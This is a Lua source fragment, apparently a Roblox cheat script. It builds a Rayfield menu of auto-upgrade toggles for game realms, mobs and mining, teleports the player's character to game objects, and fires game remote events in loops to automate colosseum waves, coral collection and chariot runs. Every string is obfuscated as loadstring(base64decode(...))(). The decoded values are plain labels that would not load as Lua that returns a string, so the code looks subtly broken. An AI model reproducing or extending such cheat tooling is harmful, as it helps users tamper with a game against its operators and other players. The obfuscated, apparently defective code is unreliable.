Realm4Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb2xsZWN0IFN0YXJz"))(), CurrentValue = false, Callback = function(v) autoCollectStarsEnabled = v end})
Realm4Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIFN0YXJz"))(), CurrentValue = false, Callback = function(v) autoMoreStarsEnabled = v end})
Realm4Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBFdmVuIE1vcmUgU3RhcnM="))(), CurrentValue = false, Callback = function(v) autoEvenMoreStarsEnabled = v end})
Realm4Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBGYXN0ZXIgU3RhciBSZXNwYXdu"))(), CurrentValue = false, Callback = function(v) autoFasterStarRespawnEnabled = v end})
Realm4Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIFNwYWNlIFBvaW50cw=="))(), CurrentValue = false, Callback = function(v) autoMoreSpacePointsStarsEnabled = v end})
Realm4Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIE9vZiAoU3RhcnMp"))(), CurrentValue = false, Callback = function(v) autoStarsMoreOofEnabled = v end})
Realm4Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBTdGFyIE11dGF0aW9uIEx1Y2s="))(), CurrentValue = false, Callback = function(v) autoStarMutationLuckEnabled = v end})
Realm4Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfjIwgU3BhY2UgUG9pbnRzIOKVkOKVkOKVkA=="))())
Realm4Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNdWx0aVN0YXI="))(), CurrentValue = false, Callback = function(v) autoSpaceMultiStarEnabled = v end})
Realm4Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIFNwYWNlIFBvaW50cw=="))(), CurrentValue = false, Callback = function(v) autoSpaceMoreSpacePointsEnabled = v end})
Realm4Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIE1vb24="))(), CurrentValue = false, Callback = function(v) autoSpaceMoreMoonEnabled = v end})
Realm4Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBCbGFja2hvbGVz"))(), CurrentValue = false, Callback = function(v) autoSpaceBlackholesEnabled = v end})
Realm4Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBTdGFyIENvbGxlY3QgUmFkaXVz"))(), CurrentValue = false, Callback = function(v) autoSpaceCollectRadiusEnabled = v end})
Realm4Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfpJYgTm9vYnMg4pWQ4pWQ4pWQ"))())
Realm4Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBBbGllbiBOb29i"))(), CurrentValue = false, Callback = function(v) autoAlienNoobEnabled = v end})
Realm4Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBEZW1vbiBOb29i"))(), CurrentValue = false, Callback = function(v) autoDemonNoobEnabled = v end})
Realm4Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBBc3Ryb25hdXQgTm9vYg=="))(), CurrentValue = false, Callback = function(v) autoAstronautNoobEnabled = v end})
Realm4Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfkr8gQ2hpcHMg4pWQ4pWQ4pWQ"))())
Realm4Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIENoaXBz"))(), CurrentValue = false, Callback = function(v) autoMoreChipsEnabled = v end})
Realm4Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBCZXR0ZXIgQ2hpcHM="))(), CurrentValue = false, Callback = function(v) autoBetterChipsEnabled = v end})
Realm4Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIFJ1bmUgTHVjayAoQ2hpcHMp"))(), CurrentValue = false, Callback = function(v) autoChipsMoreRuneLuckEnabled = v end})
Realm4Tab:CreateToggle({
    Name = loadstring(base64decode("QXV0byBDb2xsZWN0IENoaXBz"))(),
    CurrentValue = false,
    Callback = function(v)
        autoCollectChipsEnabled = v
        if v then
            pcall(function()
                local root = getRoot()
                local chip = workspace.__GAME_CONTENT.Contents[loadstring(base64decode("V09STEQgLSA0"))()].Chips[loadstring(base64decode("MQ=="))()].Main
                if root and chip and chip:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                    root.CFrame = CFrame.new(chip.Position + Vector3.new(0, 3, 0))
                end
            end)
        end
    end
})
Realm4Tab:CreateToggle({
    Name = loadstring(base64decode("QXV0byBNZXJnZSBDaGlwcw=="))(),
    CurrentValue = false,
    Callback = function(v)
        autoMergeChipsEnabled = v
        if v then
            pcall(function()
                local root = getRoot()
                local mergeBtn = workspace.__GAME_CONTENT.Contents[loadstring(base64decode("V09STEQgLSA0"))()].Chips.ChipMergeButton
                local part = mergeBtn and (mergeBtn:FindFirstChildWhichIsA(loadstring(base64decode("QmFzZVBhcnQ="))(), true) or mergeBtn.PrimaryPart)
                if root and part then root.CFrame = CFrame.new(part.Position + Vector3.new(0, 3, 0)) end
            end)
        end
    end
})
Realm4Tab:CreateToggle({Name = loadstring(base64decode("SW5zdGFudCBUZWxlcG9ydCAoU3RhcnMp"))(), CurrentValue = false, Callback = function(v) if v then useTweenStars = false end end})
Realm4Tab:CreateToggle({Name = loadstring(base64decode("U21vb3RoIFR3ZWVuIChTdGFycyk="))(), CurrentValue = true, Callback = function(v) if v then useTweenStars = true end end})

Realm5Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfq6cgQnViYmxlcyDilZDilZDilZA="))())
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBCdWJibGUgVmFsdWU="))(), CurrentValue = false, Callback = function(v) autoBubbleValueEnabled = v end})
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBCdWJibGVzIFBlciBDbGljaw=="))(), CurrentValue = false, Callback = function(v) autoBubblesPerClickEnabled = v end})
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBGbG9hdGluZyBTcGVlZA=="))(), CurrentValue = false, Callback = function(v) autoFloatingSpeedEnabled = v end})
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBCbG93IENvb2xkb3du"))(), CurrentValue = false, Callback = function(v) autoBlowCooldownEnabled = v end})
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb21ibyBDaGFyZ2U="))(), CurrentValue = false, Callback = function(v) autoComboChargeEnabled = v end})
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb21ibyBQb3dlcg=="))(), CurrentValue = false, Callback = function(v) autoComboPowerBubblesEnabled = v end})
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb21ibyBEdXJhdGlvbg=="))(), CurrentValue = false, Callback = function(v) autoComboDurationEnabled = v end})
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBBdXRvbWF0aWMgQmxvd2luZw=="))(), CurrentValue = false, Callback = function(v) autoAutomaticBlowingEnabled = v end})
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb21ibyBEZWNheQ=="))(), CurrentValue = false, Callback = function(v) autoComboDecayEnabled = v end})
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBBdXRvbWF0aWMgQmxvd2luZyBTcGVlZA=="))(), CurrentValue = false, Callback = function(v) autoAutomaticBlowingSpeedEnabled = v end})
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBPb2YgUG93ZXIgKEJ1YmJsZXMp"))(), CurrentValue = false, Callback = function(v) autoOofPowerBubblesEnabled = v end})
Realm5Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfkqggQWlyIOKVkOKVkOKVkA=="))())
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBCYXNlIEFpcg=="))(), CurrentValue = false, Callback = function(v) autoBaseAirEnabled = v end})
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb21ibyBQb3dlciAoQWlyKQ=="))(), CurrentValue = false, Callback = function(v) autoComboPowerAirEnabled = v end})
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBCdWJibGUgUG93ZXIgKEFpcik="))(), CurrentValue = false, Callback = function(v) autoBubblePowerAirEnabled = v end})
Realm5Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfqrggQ29yYWwg4pWQ4pWQ4pWQ"))())
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb3JhbCBHcm93dGggU3BlZWQ="))(), CurrentValue = false, Callback = function(v) autoCoralGrowthSpeedEnabled = v end})
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb3JhbCBWYWx1ZQ=="))(), CurrentValue = false, Callback = function(v) autoCoralValueEnabled = v end})
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBPZmZsaW5lIEdyb3d0aCBNdWx0aXBsaWVy"))(), CurrentValue = false, Callback = function(v) autoOfflineGrowthMultiplierEnabled = v end})
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBCdWJibGUgUG93ZXIgKENvcmFsKQ=="))(), CurrentValue = false, Callback = function(v) autoBubblePowerCoralEnabled = v end})
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBPb2YgUG93ZXIgKENvcmFsKQ=="))(), CurrentValue = false, Callback = function(v) autoOofPowerCoralEnabled = v end})
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBQcmlzbSBQb3dlcg=="))(), CurrentValue = false, Callback = function(v) autoPrismPowerCoralEnabled = v end})
Realm5Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb2xsZWN0IENvcmFsICgx4oCTNik="))(), CurrentValue = false, Callback = function(v)
    autoCollectCoralEnabled = v
    if v then
        task.spawn(function()
            while autoCollectCoralEnabled do
                for i = 1, 6 do
                    if not autoCollectCoralEnabled then break end
                    fireMain(loadstring(base64decode("VG91Y2hDb3JhbFNwb3Q="))(), tostring(i), true)
                    task.wait(coralCollectDelay)
                end
                task.wait(0.2)
            end
        end)
    end
})
Realm5Tab:CreateToggle({
    Name = loadstring(base64decode("QXV0byBPeXN0ZXJzIChUcmVuY2ggTG9vcCk="))(),
    CurrentValue = false,
    Callback = function(v)
        autoOystersEnabled = v
        if v then
            task.spawn(function()
                while autoOystersEnabled do
                    pcall(runAutoOystersCycle)
                    task.wait(0.5)
                end
            end)
        end
    end
})

Realm6Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfj47vuI8gTW9tZW50dW0g4pWQ4pWQ4pWQ"))())
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb3JlIE1vbWVudHVt"))(), CurrentValue = false, Callback = function(v) autoMoreMomentumEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDaGFyaW90IFN0cmVuZ3Ro"))(), CurrentValue = false, Callback = function(v) autoChariotStrengthEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDaGFyaW90IE5vb2IgUG93ZXI="))(), CurrentValue = false, Callback = function(v) autoChariotNoobPowerEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBHbG9yeSBQb3dlcg=="))(), CurrentValue = false, Callback = function(v) autoGloryPowerMomentumEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDaGFyaW90IFN0cmVuZ3RoIElJ"))(), CurrentValue = false, Callback = function(v) autoChariotStrength2Enabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBPb2YgcG93ZXI="))(), CurrentValue = false, Callback = function(v) autoOofPowerMomentumEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBHbG9yeSBQb3dlciBJSQ=="))(), CurrentValue = false, Callback = function(v) autoGloryPower2MomentumEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDaGFyaW90IFN0cmVuZ3RoIElJ"))(), CurrentValue = false, Callback = function(v) autoChariotStrength3Enabled = v end})

Realm6Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfj4YgR2xvcnkg4pWQ4pWQ4pWQ"))())
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIGdsb3J5"))(), CurrentValue = false, Callback = function(v) autoMoreGloryEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb2xvc3NldW0gSHA="))(), CurrentValue = false, Callback = function(v) autoColosseumHPEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb2xvc3NldW0gRGFtYWdl"))(), CurrentValue = false, Callback = function(v) autoColosseumDamageEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBBdHRhY2sgU3BlZWQ="))(), CurrentValue = false, Callback = function(v) autoAttackSpeedEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBNb21lbnR1bQ=="))(), CurrentValue = false, Callback = function(v) autoMomentumGloryEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb2xvc3NldW0gRGFtYWdlIElJ"))(), CurrentValue = false, Callback = function(v) autoColosseumDamage2Enabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb2xvc3NldW0gSHAgSUk="))(), CurrentValue = false, Callback = function(v) autoColosseumHP2Enabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBCdXJkZW5ubm5ubm5ubm5u"))(), CurrentValue = false, Callback = function(v) autoBurdenGloryEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBBdXRob3JpdHkgTXVsdGk="))(), CurrentValue = false, Callback = function(v) autoAuthorityMultiEnabled = v end})

Realm6Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIOKcqCBSYWRpYW5jZSBVcGdyYWRlcyDilZDilZDilZA="))())
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIHJhZGlhbmNl"))(), CurrentValue = false, Callback = function(v) autoMoreRadianceEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBFdmVuIG1vcmUgcmFkaWFuY2U="))(), CurrentValue = false, Callback = function(v) autoEvenMoreRadianceEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBPb2Zz"))(), CurrentValue = false, Callback = function(v) autoOofsRadianceEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byB0aWVyIGx1Y2s="))(), CurrentValue = false, Callback = function(v) autoTierLuckRadianceEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byB0aGUgcmFkaWFuY2UgYmFsYW5jZQ=="))(), CurrentValue = false, Callback = function(v) autoTheRadianceBalanceEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIG1vcmUgcmFkaWFuY2U="))(), CurrentValue = false, Callback = function(v) autoMoreMoreRadianceEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIG1vbWVudHVt"))(), CurrentValue = false, Callback = function(v) autoMoreMomentumRadianceEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBzdGFybGlnaHQgcG93ZXI="))(), CurrentValue = false, Callback = function(v) autoStarlightPowerRadianceEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byB0aHVuZGVyIHBvd2Vy"))(), CurrentValue = false, Callback = function(v) autoThunderPowerRadianceEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBzdWNoIGEgbW9tZW50"))(), CurrentValue = false, Callback = function(v) autoSuchAMomentRadianceEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBzdWNoIGEgYnVyZGVu"))(), CurrentValue = false, Callback = function(v) autoSuchABurdenRadianceEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBzdWNoIGEgZ2xvcnk="))(), CurrentValue = false, Callback = function(v) autoSuchAGloryRadianceEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBsb29rIHVwIHRoZSBza3k="))(), CurrentValue = false, Callback = function(v) autoLookUpTheSkyRadianceEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBzdGFybGlnaHQgYWdhaW4="))(), CurrentValue = false, Callback = function(v) autoStarlightAgainRadianceEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBidXJkZW4gYWdhaW4="))(), CurrentValue = false, Callback = function(v) autoBurdenAgainRadianceEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byB1cGdyYWRlIHBpbGxhciAx"))(), CurrentValue = false, Callback = function(v) autoUpgradePillar1Enabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byB1cGdyYWRlIHBpbGxhciAy"))(), CurrentValue = false, Callback = function(v) autoUpgradePillar2Enabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byB1cGdyYWRlIHBpbGxhciAz"))(), CurrentValue = false, Callback = function(v) autoUpgradePillar3Enabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byB1cGdyYWRlIHBpbGxhciA0"))(), CurrentValue = false, Callback = function(v) autoUpgradePillar4Enabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byB1cGdyYWRlIHBpbGxhciA1"))(), CurrentValue = false, Callback = function(v) autoUpgradePillar5Enabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("RW5hYmxlIGFsbCBwaWxsYXJzIHVwZ3JhZGVz"))(), CurrentValue = false, Callback = function(v) autoAllPillarsEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBzdW4gcGlsbGFyIHJhbms="))(), CurrentValue = false, Callback = function(v) autoSunPillarRankEnabled = v end})

Realm6Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIOKtkCBTdGFybGlnaHQgVXBncmFkZXMg4pWQ4pWQ4pWQ"))())
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIHN0YXJsaWdodA=="))(), CurrentValue = false, Callback = function(v) autoMoreStarlightEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBzdGVsbGFyIFJhZGlhbmNl"))(), CurrentValue = false, Callback = function(v) autoStellarRadianceEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIHRodW5kZXI="))(), CurrentValue = false, Callback = function(v) autoMoreThunderEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBjb3NtaWMgb29m"))(), CurrentValue = false, Callback = function(v) autoCosmicOofEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBydW5lIGJ1bGshPw=="))(), CurrentValue = false, Callback = function(v) autoRuneBulkStarlightEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBhdXRob3JpdHk="))(), CurrentValue = false, Callback = function(v) autoAuthorityStarlightEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb21lbnR1bQ=="))(), CurrentValue = false, Callback = function(v) autoMomentumStarlightEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byByYWRpYW5jZQ=="))(), CurrentValue = false, Callback = function(v) autoRadianceStarlightEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBzdGFybGlnaHQ="))(), CurrentValue = false, Callback = function(v) autoStarlight77Enabled = v end})

Realm6Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIOKaoSBUaHVuZGVyIFVwZ3JhZGVzIOKVkOKVkOKVkA=="))())
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIHRodW5kZXI="))(), CurrentValue = false, Callback = function(v) autoMoreThunderUpgradesEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byB0aHVuZGVyIGRhbWFnZQ=="))(), CurrentValue = false, Callback = function(v) autoThunderDamageEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBsaWdodG5pbmcgc3BlZWQ="))(), CurrentValue = false, Callback = function(v) autoLightningSpeedEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byB3ZWFrIHBvaW50IHBvd2Vy"))(), CurrentValue = false, Callback = function(v) autoWeakPointPowerEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIHJhZGlhbmNl"))(), CurrentValue = false, Callback = function(v) autoMoreRadianceThunderEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIHN0YXJsaWdodA=="))(), CurrentValue = false, Callback = function(v) autoMoreStarlightThunderEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDcm9udXMgbm9vYiBwb3dlcg=="))(), CurrentValue = false, Callback = function(v) autoCronusNoobPowerEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBFdmVyIEZlbHQgT3ZlcnBvd2VyZWQ/"))(), CurrentValue = false, Callback = function(v) autoEverFeltOverpoweredEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIHRodW5kZXIgSUk="))(), CurrentValue = false, Callback = function(v) autoMoreThunder2Enabled = v end})

Realm6Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIOKaoSBUaHJvdyBMaWdodG5pbmcg4pWQ4pWQ4pWQ"))())
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byB0aHJvdyBsaWdodG5pbmcgYXQgWmV1cw=="))(), CurrentValue = false, Callback = function(v) autoThrowLightningZeusEnabled = v end})

Realm6Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIOKMmyBDcm9udXMgUmFuayBVcCDilZDilZDilZA="))())
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDcm9udXMgcmFuayB1cA=="))(), CurrentValue = false, Callback = function(v) autoCronusRankUpEnabled = v end})

Realm6Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfkZEgQXV0aG9yaXR5IFVwZ3JhZGVzIOKVkOKVkOKVkA=="))())
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIGF1dGhvcml0eQ=="))(), CurrentValue = false, Callback = function(v) autoMoreAuthorityEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIGJ1cmRlbg=="))(), CurrentValue = false, Callback = function(v) autoMoreBurdenAuthorityEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIGdsb3J5"))(), CurrentValue = false, Callback = function(v) autoMoreGloryAuthorityEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIHN0YXJsaWdodA=="))(), CurrentValue = false, Callback = function(v) autoMoreStarlightAuthorityEnabled = v end})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBtb3JlIHRodW5kZXI="))(), CurrentValue = false, Callback = function(v) autoMoreThunderAuthorityEnabled = v end})

Realm6Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfj5vvuI8gQ291bmNpbCBSYW5rIFVwIOKVkOKVkOKVkA=="))())
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBjb3VuY2lsIHJhbmsgdXA="))(), CurrentValue = false, Callback = function(v) autoCouncilRankUpEnabled = v end})

Realm6Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfj5/vuI8gQ29sb3NzZXVtIFdhdmVzIOKVkOKVkOKVkA=="))())
Realm6Tab:CreateInput({
    Name = loadstring(base64decode("U2VsZWN0IFdhdmUgKDHigJM2NTAp"))(),
    PlaceholderText = loadstring(base64decode("MjA="))(),
    RemoveTextAfterFocusLost = false,
    Callback = function(text)
        local n = tonumber(text)
        if n then selectColosseumWave(n) end
    end
})
Realm6Tab:CreateToggle({
    Name = loadstring(base64decode("QXV0byBDb2xvc3NldW0gV2F2ZXM="))(),
    CurrentValue = false,
    Callback = function(v)
        autoColosseumWavesEnabled = v
        if v then
            selectColosseumWave(selectedColosseumWave)
            task.wait(0.5)
            task.spawn(function()
                while autoColosseumWavesEnabled do
                    fireMain(loadstring(base64decode("U2VsZWN0Q29sb3NzZXVtV2F2ZQ=="))(), selectedColosseumWave)
                    task.wait(0.3)
                    fireMain(loadstring(base64decode("U3RhcnRDb2xvc3NldW0="))())
                    task.wait(1.0)
                end
            end)
        end
    end
})
Realm6Tab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIPCfj4cgQXV0byBDaGFyaW90IOKVkOKVkOKVkA=="))())
Realm6Tab:CreateToggle({
    Name = loadstring(base64decode("QXV0byBDaGFyaW90"))(),
    CurrentValue = false,
    Callback = function(v)
        autoChariotEnabled = v
        if v then
            task.spawn(function()
                startAutoChariot()
            end)
            Rayfield:Notify({Title = loadstring(base64decode("QXV0byBDaGFyaW90"))(), Content = loadstring(base64decode("VFAgYmVoaW5kIGNhcnQg4oaSIHdhaXQg"))() .. chariotStartDelay .. loadstring(base64decode("cyDihpIgd2Fsaw=="))(), Duration = 4})
        else
            stopAutoChariot()
        end
    end
})
Realm6Tab:CreateToggle({Name = loadstring(base64decode("QXV0byBDaGFyaW90IFJhbmsgVXA="))(), CurrentValue = false, Callback = function(v) autoChariotRankUpEnabled = v end})

EventRealmTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIOKavSBFdmVudCDilZDilZDilZA="))())
EventRealmTab:CreateToggle({Name = loadstring(base64decode("QXV0byBLaWNr"))(), CurrentValue = false, Callback = function(v) autoKickEnabled = v end})
EventRealmTab:CreateToggle({Name = loadstring(base64decode("TW9yZSBHb2Fscw=="))(), CurrentValue = false, Callback = function(v) autoMoreGoalsEnabled = v end})
EventRealmTab:CreateToggle({Name = loadstring(base64decode("Ri5SdW5lIEJ1bGs="))(), CurrentValue = false, Callback = function(v) autoRuneBulkEnabled = v end})
EventRealmTab:CreateToggle({Name = loadstring(base64decode("Ri5SdW5lIEx1Y2s="))(), CurrentValue = false, Callback = function(v) autoRuneLuckEnabled = v end})
EventRealmTab:CreateToggle({Name = loadstring(base64decode("Rm9vdGJhbGwgUmFua2luZw=="))(), CurrentValue = false, Callback = function(v) autoFootballRankingEnabled = v end})

AutoMobsTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIOKalO+4jyBBdXRvIE1vYnMg4pWQ4pWQ4pWQ"))())
AutoMobsTab:CreateToggle({Name = loadstring(base64decode("QXV0byBPcmM="))(), CurrentValue = false, Callback = function(v) autoOrcEnabled = v visitedMobs = {} end})
AutoMobsTab:CreateToggle({Name = loadstring(base64decode("QXV0byBHb2JsaW4="))(), CurrentValue = false, Callback = function(v) autoGoblinEnabled = v visitedMobs = {} end})
AutoMobsTab:CreateToggle({Name = loadstring(base64decode("QXV0byBXYXJyaW9y"))(), CurrentValue = false, Callback = function(v) autoWarriorEnabled = v visitedMobs = {} end})
AutoMobsTab:CreateToggle({Name = loadstring(base64decode("QXV0byBOaW5qYQ=="))(), CurrentValue = false, Callback = function(v) autoNinjaEnabled = v visitedMobs = {} end})
AutoMobsTab:CreateToggle({Name = loadstring(base64decode("QXV0byBQaXJhdGU="))(), CurrentValue = false, Callback = function(v) autoPirateEnabled = v visitedMobs = {} end})
AutoMobsTab:CreateToggle({Name = loadstring(base64decode("QXV0byBTYW11cmFp"))(), CurrentValue = false, Callback = function(v) autoSamuraiEnabled = v visitedMobs = {} end})
AutoMobsTab:CreateToggle({Name = loadstring(base64decode("QXV0byBEYXJrIENvbW1hbmRlcg=="))(), CurrentValue = false, Callback = function(v) autoDarkCommanderEnabled = v visitedMobs = {} end})
AutoMobsTab:CreateToggle({Name = loadstring(base64decode("QXV0byBQaXJhdGUgQ2FwdGFpbg=="))(), CurrentValue = false, Callback = function(v) autoPirateCaptainEnabled = v visitedMobs = {} end})
AutoMobsTab:CreateToggle({Name = loadstring(base64decode("QXV0byBQaXJhdGUgQWRtaXJhbA=="))(), CurrentValue = false, Callback = function(v) autoPirateAdmiralEnabled = v visitedMobs = {} end})
AutoMobsTab:CreateToggle({Name = loadstring(base64decode("QXV0byBTYW11cmFpIE1hc3Rlcg=="))(), CurrentValue = false, Callback = function(v) autoSamuraiMasterEnabled = v visitedMobs = {} end})
AutoMobsTab:CreateToggle({Name = loadstring(base64decode("QXV0byBEYXJrIEtuaWdodA=="))(), CurrentValue = false, Callback = function(v) autoDarkKnightEnabled = v visitedMobs = {} end})
AutoMobsTab:CreateToggle({Name = loadstring(base64decode("SW5zdGFudCBUZWxlcG9ydCAoTW9icyk="))(), CurrentValue = false, Callback = function(v) if v then useTweenMobs = false end end})
AutoMobsTab:CreateToggle({Name = loadstring(base64decode("U21vb3RoIFR3ZWVuIChNb2JzKQ=="))(), CurrentValue = true, Callback = function(v) if v then useTweenMobs = true end end})

AutoMineTab:CreateLabel(loadstring(base64decode("4pWQ4pWQ4pWQIOKbj++4jyBBdXRvIE1pbmluZyDilZDilZDilZA="))())
AutoMineTab:CreateToggle({Name = loadstring(base64decode("QXV0byBDb2Fs"))(), CurrentValue = false, Callback = function(v) autoCoalEnabled = v visitedOres = {} end})
